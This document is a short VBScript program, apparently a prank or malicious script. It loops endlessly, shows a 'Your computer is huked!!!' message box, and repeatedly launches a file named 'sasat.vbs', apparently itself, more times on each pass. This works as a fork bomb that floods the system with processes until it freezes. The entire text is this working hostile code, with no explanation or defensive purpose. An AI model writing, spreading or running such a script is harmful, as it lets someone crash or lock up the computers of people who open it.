dim i
set object = wscript.CreateObject("wscript.shell")
do
   msgbox("Your computer is huked!!!")
   FOR n = 0 to i 
      object.run "sasat.vbs"
   NEXT
i = i + 1
loop